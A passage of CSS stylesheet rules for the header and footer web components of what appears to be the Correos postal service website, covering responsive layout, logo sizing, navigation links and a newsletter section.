				width: 314px
			}
		}

		@media (min-width: 1024px) {
			[variant=portalname].sc-correos-cdk-core-header-h .cdk-expand-search.sc-correos-cdk-core-header {
				top: var(--cdk-core-header-height-portalname);
				height: calc(100% - var(--cdk-core-header-height-portalname))
			}
		}

		[variant=site].sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-start.sc-correos-cdk-core-header .cdk-nav-button.sc-correos-cdk-core-header {
			padding-left: 32px
		}

		@media (min-width: 1024px) {
			[variant=site].sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-start.sc-correos-cdk-core-header .cdk-nav-button.sc-correos-cdk-core-header {
				display: none
			}
		}

		@media (min-width: 1024px) {
			[variant=site].sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-start.sc-correos-cdk-core-header .--moreThanSix.sc-correos-cdk-core-header {
				display: -ms-flexbox;
				display: flex
			}
		}

		@media (min-width: 1024px) {
			[variant=site].sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-start.sc-correos-cdk-core-header .--showDesktop.sc-correos-cdk-core-header {
				display: -ms-flexbox;
				display: flex
			}
		}

		[variant=site].sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-start.sc-correos-cdk-core-header .cdk-header-logo-container.sc-correos-cdk-core-header {
			width: -webkit-max-content;
			width: -moz-max-content;
			width: max-content
		}

		[variant=site].sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-start.sc-correos-cdk-core-header .cdk-header-logo-container.sc-correos-cdk-core-header img.sc-correos-cdk-core-header {
			width: 84px;
			height: 32px
		}

		[variant=site].sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-links.sc-correos-cdk-core-header {
			display: none;
			-ms-flex-direction: row;
			flex-direction: row;
			-ms-flex-pack: center;
			justify-content: center;
			width: 100%
		}

		[variant=site].sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-links.sc-correos-cdk-core-header .cdk-header-link.sc-correos-cdk-core-header {
			text-transform: uppercase;
			color: var(--_cdk-core-header-color-links);
			font-size: 100%;
			margin: 0;
			padding: 0;
			font-weight: normal;
			font-size: 16px
		}

		[variant=site].sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-links.sc-correos-cdk-core-header .cdk-header-link.sc-correos-cdk-core-header::after {
			content: "";
			width: 40px;
			height: 1px;
			background-color: none;
			display: inline-block
		}

		[variant=site].sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-links.sc-correos-cdk-core-header .cdk-header-link.sc-correos-cdk-core-header:last-child::after {
			width: 0px;
			height: 0px
		}

		[variant=site].sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-title.sc-correos-cdk-core-header {
			display: none
		}

		@media (min-width: 1024px) {
			[variant=site].sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-title.sc-correos-cdk-core-header {
				display: -ms-flexbox;
				display: flex
			}
		}

		[variant=site].sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-search-input-container.sc-correos-cdk-core-header {
			position: absolute;
			left: 0;
			right: 0
		}

		@media (max-width: 639px) {
			[variant=site].sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-search-input-container.sc-correos-cdk-core-header {
				top: 8px
			}
		}

		@media (min-width: 640px) {
			[variant=site].sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-search-input-container.sc-correos-cdk-core-header {
				top: 8px
			}
		}

		[variant=site].sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .has-not-border.sc-correos-cdk-core-header {
			border-bottom: 0px
		}

		[variant=site].sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .has-border.sc-correos-cdk-core-header {
			border-bottom: 1px solid var(--theme-color-softGrey)
		}

		[variant=site].sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-input-full-container.sc-correos-cdk-core-header {
			display: block;
			background-color: white;
			width: 100%;
			top: 8px
		}

		@media (min-width: 1024px) {
			[variant=site].sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-input-full-container.sc-correos-cdk-core-header .cdk-header-input-search.sc-correos-cdk-core-header {
				width: 100%
			}
		}

		[variant=site].sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-input-full-container.sc-correos-cdk-core-header .cdk-header-close-button.sc-correos-cdk-core-header {
			display: inline-block;
			position: relative;
			width: 10%
		}

		[variant=site].sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-input-full-container.sc-correos-cdk-core-header .cdk-header-close-button.sc-correos-cdk-core-header .cdk-header-close-icon.sc-correos-cdk-core-header {
			margin: 0 auto;
			color: var(--_cdk-core-header-text-color)
		}

		@media (min-width: 1440px) {
			[variant=site].sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-input-full-container.sc-correos-cdk-core-header .cdk-header-close-button.sc-correos-cdk-core-header .cdk-header-close-icon.sc-correos-cdk-core-header {
				margin-left: 35px
			}
		}

		[variant=site].sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-input-full-container--mobile-open.sc-correos-cdk-core-header {
			display: -ms-flexbox;
			display: flex
		}

		@media (min-width: 1024px) {
			[variant=site].sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-input-full-container--mobile-open.sc-correos-cdk-core-header {
				height: 80px
			}
		}

		[variant=site].sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-input-full-container--mobile-open.sc-correos-cdk-core-header .cdk-header-input-search.sc-correos-cdk-core-header {
			width: 90%;
			display: -ms-flexbox;
			display: flex;
			position: relative;
			border-right: 1px solid var(--theme-color-softGrey);
			-ms-flex-align: center;
			align-items: center;
			margin-bottom: 1px
		}

		[variant=site].sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-input-full-container--mobile-close.sc-correos-cdk-core-header {
			display: none
		}

		[variant=site].sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-nav-page.--lv-first.sc-correos-cdk-core-header {
			background-color: white
		}

		@media (min-width: 1024px) {
			[variant=site].sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header {
				top: 80px
			}
		}

		@media (min-width: 1440px) {
			[variant=site].sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header {
				top: 88px
			}
		}

		@media (min-width: 1024px) {
			[variant=site].sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-langs--margin-top.sc-correos-cdk-core-header {
				margin-top: 28px
			}
		}

		@media (max-width: 639px) {
			[variant=site].sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-langs--margin-top.sc-correos-cdk-core-header {
				margin-top: 10px
			}
		}

		[variant=site].sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-logo-container.sc-correos-cdk-core-header img.sc-correos-cdk-core-header {
			width: 17px;
			height: 7px
		}

		[variant=site].sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-logo-container.sc-correos-cdk-core-header::after {
			right: -17px
		}

		@media (min-width: 640px) {
			[variant=site].sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-start.sc-correos-cdk-core-header .cdk-header-logo-container.sc-correos-cdk-core-header img.sc-correos-cdk-core-header {
				width: 84px;
				height: 32px
			}
		}

		@media (min-width: 1024px) {
			[variant=site].sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header {
				height: 80px
			}

			[variant=site].sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-start.sc-correos-cdk-core-header .cdk-header-logo-container.sc-correos-cdk-core-header img.sc-correos-cdk-core-header {
				width: 106px;
				height: 40px
			}

			[variant=site].sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-start.sc-correos-cdk-core-header .cdk-header-logo-container.sc-correos-cdk-core-header::after {
				height: 0px;
				width: 0px
			}

			[variant=site].sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-start.sc-correos-cdk-core-header .--moreThanSix.sc-correos-cdk-core-header .cdk-header-logo-container.sc-correos-cdk-core-header::after {
				width: 1px;
				height: 33px;
				right: -16px
			}

			[variant=site].sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-links.sc-correos-cdk-core-header {
				display: -ms-flexbox;
				display: flex
			}

			[variant=site].sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-links.sc-correos-cdk-core-header .active.sc-correos-cdk-core-header {
				font-weight: bold;
				border-bottom: 1px solid var(--_cdk-core-header-color-links);
				padding-bottom: 7px
			}
		}

		@media (min-width: 1440px) {
			[variant=site].sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header {
				height: 88px
			}

			[variant=site].sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-start.sc-correos-cdk-core-header .cdk-header-logo-container.sc-correos-cdk-core-header img.sc-correos-cdk-core-header {
				width: 127px;
				height: 47px
			}

			[variant=site].sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-start.sc-correos-cdk-core-header .cdk-header-logo-container.sc-correos-cdk-core-header::after {
				height: 0px;
				width: 0px
			}

			[variant=site].sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-start.sc-correos-cdk-core-header .--moreThanSix.sc-correos-cdk-core-header .cdk-header-logo-container.sc-correos-cdk-core-header::after {
				width: 1px;
				height: 33px;
				right: -16px
			}

			[variant=site].sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-links.sc-correos-cdk-core-header {
				display: -ms-flexbox;
				display: flex
			}
		}

		[variant=site].sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header {
			padding-bottom: 64px
		}

		[variant=site].sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-lv-first.sc-correos-cdk-core-header .cdk-nav-lv-first-item.sc-correos-cdk-core-header {
			width: 100%;
			-webkit-box-sizing: border-box;
			box-sizing: border-box
		}

		@media (min-width: 1024px) {

			[variant=site].sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-lv-first.sc-correos-cdk-core-header .cdk-nav-lv-first-item.sc-correos-cdk-core-header:nth-child(2).--with-switch>a.sc-correos-cdk-core-header,
			[variant=site].sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-lv-first.sc-correos-cdk-core-header .cdk-nav-lv-first-item.sc-correos-cdk-core-header:nth-child(2).--with-switch>button.sc-correos-cdk-core-header {
				border-top: 1px solid rgba(128, 128, 128, 0.5)
			}
		}

		@media (min-width: 1024px) {

			[variant=site].sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-lv-first.sc-correos-cdk-core-header .cdk-nav-lv-first-item.sc-correos-cdk-core-header:nth-child(2).--no-border>a.sc-correos-cdk-core-header,
			[variant=site].sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-lv-first.sc-correos-cdk-core-header .cdk-nav-lv-first-item.sc-correos-cdk-core-header:nth-child(2).--no-border>button.sc-correos-cdk-core-header {
				border-top: 0
			}
		}

		.cdk-nav-lv-img-setting.sc-correos-cdk-core-header {
			width: 24px;
			margin-right: 1rem
		}

		@media (min-width: 1024px) {
			.cdk-nav-lv-third-columns.sc-correos-cdk-core-header {
				margin-left: 32px
			}
		}

		.cdk-header-logo-container.sc-correos-cdk-core-header {
			display: -ms-flexbox;
			display: flex;
			-ms-flex-pack: center;
			justify-content: center;
			-ms-flex-align: center;
			align-items: center;
			height: 100%;
			width: 56px;
			display: flex;
			position: relative;
			color: var(--_cdk-core-header-color-logo)
		}

		.cdk-header-logo-container.sc-correos-cdk-core-header::after {
			content: "";
			position: absolute;
			width: 1px;
			height: 33px;
			right: -5px;
			background-color: #d8d8d8
		}

		@media (min-width: 640px) {
			.cdk-header-logo-container.sc-correos-cdk-core-header::after {
				right: -12px
			}
		}

		@media (min-width: 1024px) {
			.cdk-header-logo-container.sc-correos-cdk-core-header {
				min-width: 80px
			}

			.cdk-header-logo-container.sc-correos-cdk-core-header::after {
				right: -16px;
				height: 48px
			}
		}

		.cdk-header-logo.sc-correos-cdk-core-header {
			width: 37px;
			height: 37px;
			color: var(--_cdk-core-header-color-logo)
		}

		@media (min-width: 640px) {
			.cdk-header-logo.sc-correos-cdk-core-header {
				width: 40px;
				height: 40px
			}
		}

		@media (min-width: 1024px) {
			.cdk-header-logo.sc-correos-cdk-core-header {
				width: 48px;
				height: 46px
			}
		}
	</style>
	<style>
		.sc-correos-cdk-core-footer-h {
			--_cdk-core-footer-background-color-rrss: var(--cdk-core-footer-background-color-rrss, #FFCD00);
			--_cdk-core-footer-background-color-lite: var(--cdk-core-footer-background-color-lite, #333333);
			--_cdk-core-footer-background-color: var(--cdk-core-footer-background-color, #333333);
			--_cdk-core-footer-color-font: var(--cdk-core-footer-color-font, #ffffff);
			--_cdk-core-footer-border-color: var(--cdk-core-footer-border-color, #cbcbcb);
			--_cdk-core-footer-icon-color: var(--cdk-core-footer-icon-color, #002e6d);
			--_cdk-core-footer-color-font-dark: var(--cdk-core-footer-color-font-dark, #002e6d);
			--_cdk-core-footer-newsletter-bg: var(--cdk-core-footer-color-bg-newsletter, #f8f8f8);
			--_cdk-core-footer-newsletter-title: var(--cdk-core-footer-color-title-newsletter, #333333);
			--_cdk-core-footer-color-rectangle: var(--cdk-core-footer-color-color-rectangle, #ffcd00);
			--_cdk-core-footer-color-left-links: var(--cdk-core-footer-color-color-left-links, #002e6d)
		}

		.sc-correos-cdk-core-footer-h {
			display: block;
			width: 100%;
			height: 100%;
			font-size: 0;
			z-index: 13
		}

		.sc-correos-cdk-core-footer-h .cdk-section-dark.sc-correos-cdk-core-footer {
			-webkit-box-shadow: 0 -5px 20px 0 rgba(0, 0, 0, 0.1);
			box-shadow: 0 -5px 20px 0 rgba(0, 0, 0, 0.1);
			background-color: var(--_cdk-core-footer-background-color)
		}

		.sc-correos-cdk-core-footer-h .cdk-section-lite.sc-correos-cdk-core-footer {
			background-color: var(--_cdk-core-footer-background-color-lite)
		}

		.sc-correos-cdk-core-footer-h .cdk-section-lite-rrss.sc-correos-cdk-core-footer {
			background-color: var(--_cdk-core-footer-background-color-lite);
			overflow: hidden
		}

		.sc-correos-cdk-core-footer-h .cdk-section-sticky.sc-correos-cdk-core-footer {
			overflow: hidden;
			background-color: var(--_cdk-core-footer-background-color-lite)
		}

		.sc-correos-cdk-core-footer-h .cdk-newsletter-section.sc-correos-cdk-core-footer {
			background-color: var(--_cdk-core-footer-newsletter-bg);
			padding: 40px 0;
			display: -ms-flexbox;
			display: flex;
			-ms-flex-direction: column;
			flex-direction: column;
			-webkit-box-shadow: 0 -5px 20px 0 rgba(0, 0, 0, 0.1);
			box-shadow: 0 -5px 20px 0 rgba(0, 0, 0, 0.1)
		}

		.sc-correos-cdk-core-footer-h .cdk-newsletter-section.sc-correos-cdk-core-footer .cdk-newsletter-img.sc-correos-cdk-core-footer {
			display: none
		}

		.sc-correos-cdk-core-footer-h .cdk-newsletter-section.sc-correos-cdk-core-footer .cdk-newsletter-content.sc-correos-cdk-core-footer {
			display: -ms-flexbox;
			display: flex;
			-ms-flex-direction: column;
			flex-direction: column
		}

		.sc-correos-cdk-core-footer-h .cdk-newsletter-section.sc-correos-cdk-core-footer .cdk-newsletter-content.sc-correos-cdk-core-footer .cdk-fieldset.sc-correos-cdk-core-footer {
			border: 0;
			padding: 0;
			margin: 0;
			min-width: 0
		}

		.sc-correos-cdk-core-footer-h .cdk-newsletter-section.sc-correos-cdk-core-footer .cdk-newsletter-content.sc-correos-cdk-core-footer .cdk-newsletter-title.sc-correos-cdk-core-footer {
			font-size: 100%;
			margin: 0;
			padding: 0;
			font-weight: normal;
			color: var(--_cdk-core-footer-newsletter-title);
			font-size: 1.5rem;
			line-height: 2.25rem;
			margin-bottom: 8px
		}

		@media (min-width: 1024px) {
			.sc-correos-cdk-core-footer-h .cdk-newsletter-section.sc-correos-cdk-core-footer .cdk-newsletter-content.sc-correos-cdk-core-footer .cdk-newsletter-title.sc-correos-cdk-core-footer {
				font-size: 2rem;
				line-height: 2.75rem
			}
		}

		.sc-correos-cdk-core-footer-h .cdk-newsletter-section.sc-correos-cdk-core-footer .cdk-newsletter-content.sc-correos-cdk-core-footer .cdk-newsletter-info.sc-correos-cdk-core-footer .cdk-newsletter-description.sc-correos-cdk-core-footer {
			font-size: 100%;
			margin: 0;
			padding: 0;
			font-weight: normal;
			font-size: 1rem;
			line-height: 1.5rem;
			font-weight: 300;
			margin-bottom: 16px
		}

		@media (min-width: 1024px) {
			.sc-correos-cdk-core-footer-h .cdk-newsletter-section.sc-correos-cdk-core-footer .cdk-newsletter-content.sc-correos-cdk-core-footer .cdk-newsletter-info.sc-correos-cdk-core-footer .cdk-newsletter-description.sc-correos-cdk-core-footer {
				font-size: 1.125rem;
				line-height: 1.875rem
			}
		}

		.sc-correos-cdk-core-footer-h .cdk-newsletter-section.sc-correos-cdk-core-footer .cdk-newsletter-content.sc-correos-cdk-core-footer .cdk-newsletter-info.sc-correos-cdk-core-footer .cdk-newsletter-input.sc-correos-cdk-core-footer {
			margin-bottom: 16px
		}

		.sc-correos-cdk-core-footer-h .cdk-newsletter-section.sc-correos-cdk-core-footer .cdk-newsletter-content.sc-correos-cdk-core-footer .cdk-newsletter-info.sc-correos-cdk-core-footer .cdk-newsletter-checkbox.sc-correos-cdk-core-footer {
			margin-bottom: 16px
		}

		.sc-correos-cdk-core-footer-h .cdk-contact-section.sc-correos-cdk-core-footer {
			background-color: #F8F8F8;
			-webkit-box-shadow: 0 -5px 20px 0 rgba(0, 0, 0, 0.1);
			box-shadow: 0 -5px 20px 0 rgba(0, 0, 0, 0.1);
			padding: 40px 0
		}

		.sc-correos-cdk-core-footer-h .sticky-pos.sc-correos-cdk-core-footer {
			width: 100%;
			position: fixed;
			bottom: 0
		}

		.sc-correos-cdk-core-footer-h .cdk-footer-container.sc-correos-cdk-core-footer {
			display: block;
			width: 100%;
			padding: 0 24px;
			padding-top: 40px
		}

		.sc-correos-cdk-core-footer-h .cdk-footer-container__isNewsletter.sc-correos-cdk-core-footer {
			padding: 24px
		}

		.sc-correos-cdk-core-footer-h .cdk-footer-container--no-links.sc-correos-cdk-core-footer {
			padding-top: 0
		}

		.sc-correos-cdk-core-footer-h .cdk-container-links.sc-correos-cdk-core-footer {
			-webkit-margin-before: 0;
			margin-block-start: 0;
			-webkit-margin-after: 0;
			margin-block-end: 0;
			margin: 0;
			padding: 0;
			list-style: none;
			display: -ms-flexbox;
			display: flex;
			width: 100%;
			-ms-flex-align: start;
			align-items: flex-start;
			-ms-flex-wrap: wrap;
			flex-wrap: wrap
		}

		.sc-correos-cdk-core-footer-h .cdk-footer-rrss.sc-correos-cdk-core-footer {
			z-index: 13
		}

		.sc-correos-cdk-core-footer-h .cdk-white-list.sc-correos-cdk-core-footer {
			-ms-flex: 0 1 100%;
			flex: 0 1 100%;
			width: 100%;
			padding: 15px 0;
			border-bottom: 1px solid var(--_cdk-core-footer-border-color)
		}

		.sc-correos-cdk-core-footer-h .cdk-white-list.sc-correos-cdk-core-footer:first-child {
			padding-top: 0
		}

		.sc-correos-cdk-core-footer-h .cdk-white-list.sc-correos-cdk-core-footer:last-child {
			border-bottom: 0;
			padding: 0
		}

		.sc-correos-cdk-core-footer-h .cdk-white-list__btn.sc-correos-cdk-core-footer {
			border: unset;
			cursor: pointer;
			margin: 0;
			padding: 0;
			width: unset;
			overflow: unset;
			background: unset;
			text-align: flex-start;
			color: inherit;
			font: inherit;
			line-height: inherit;
			-webkit-font-smoothing: inherit;
			-moz-osx-font-smoothing: inherit;
			-webkit-appearance: none;
			font-size: 1.125rem;
			line-height: 1.625rem;
			display: -ms-flexbox;
			display: flex;
			width: 100%;
			-ms-flex-align: center;
			align-items: center;
			-ms-flex-pack: justify;
			justify-content: space-between
		}

		.sc-correos-cdk-core-footer-h .cdk-white-list__btn.sc-correos-cdk-core-footer::-moz-focus-inner {
			border: 0;
			padding: 0
		}

		@media (min-width: 1024px) {
			.sc-correos-cdk-core-footer-h .cdk-white-list__btn.sc-correos-cdk-core-footer {
				font-size: 1.5rem;
				line-height: 2.25rem
			}
		}

		.sc-correos-cdk-core-footer-h .cdk-white-list__btn.sc-correos-cdk-core-footer:focus {
			outline: none
		}

		.sc-correos-cdk-core-footer-h .cdk-white-list__icon.sc-correos-cdk-core-footer {
			position: relative;
			height: 8px;
			width: 8px
		}

		.sc-correos-cdk-core-footer-h .cdk-white-list__icon.sc-correos-cdk-core-footer::before,
		.sc-correos-cdk-core-footer-h .cdk-white-list__icon.sc-correos-cdk-core-footer::after {
			content: "";
			position: absolute;
			bottom: 0px;
			width: 0.1rem;
			height: 100%;
			border-radius: 8px;
			-webkit-transition: all 0.2s;
			transition: all 0.2s
		}

		.sc-correos-cdk-core-footer-h .cdk-white-list__icon.sc-correos-cdk-core-footer::before {
			left: -2px;
			-webkit-transition: all 0.2s;
			transition: all 0.2s;
			-webkit-transform: rotate(-45deg);
			transform: rotate(-45deg);
			background-color: var(--_cdk-core-footer-icon-color)
		}

		.sc-correos-cdk-core-footer-h .cdk-white-list__icon.sc-correos-cdk-core-footer::after {
			left: 2.5px;
			-webkit-transition: all 0.2s;
			transition: all 0.2s;
			-webkit-transform: rotate(45deg);
			transform: rotate(45deg);
			background-color: var(--_cdk-core-footer-icon-color)
		}

		.sc-correos-cdk-core-footer-h .cdk-white-list__icon.active.sc-correos-cdk-core-footer::before {
			left: -2px;
			-webkit-transition: all 0.2s;
			transition: all 0.2s;
			-webkit-transform: rotate(45deg);
			transform: rotate(45deg)
		}

		.sc-correos-cdk-core-footer-h .cdk-white-list__icon.active.sc-correos-cdk-core-footer::after {
			left: 2.5px;
			-webkit-transition: all 0.2s;
			transition: all 0.2s;
			-webkit-transform: rotate(-45deg);
			transform: rotate(-45deg)
		}

		.sc-correos-cdk-core-footer-h .cdk-white-list__container.sc-correos-cdk-core-footer {
			padding: 15px 0;
			border-bottom: 1px solid var(--_cdk-core-footer-border-color);
			margin-bottom: 24px
		}

		.sc-correos-cdk-core-footer-h .cdk-white-list__list.sc-correos-cdk-core-footer {
			-webkit-margin-before: 0;
			margin-block-start: 0;
			-webkit-margin-after: 0;
			margin-block-end: 0;
			margin: 0;
			padding: 0;
			list-style: none;
			opacity: 0;
			height: 0;
			pointer-events: none
		}

		.sc-correos-cdk-core-footer-h .cdk-white-list__list.active.sc-correos-cdk-core-footer {
			padding-top: 20px;
			pointer-events: all;
			height: auto;
			opacity: 1;
			-webkit-transition: all 0.45s cubic-bezier(0.55, 0.05, 0.05, 0.96);
			transition: all 0.45s cubic-bezier(0.55, 0.05, 0.05, 0.96);
			-webkit-transition-property: opacity, -webkit-transform;
			transition-property: opacity, -webkit-transform;
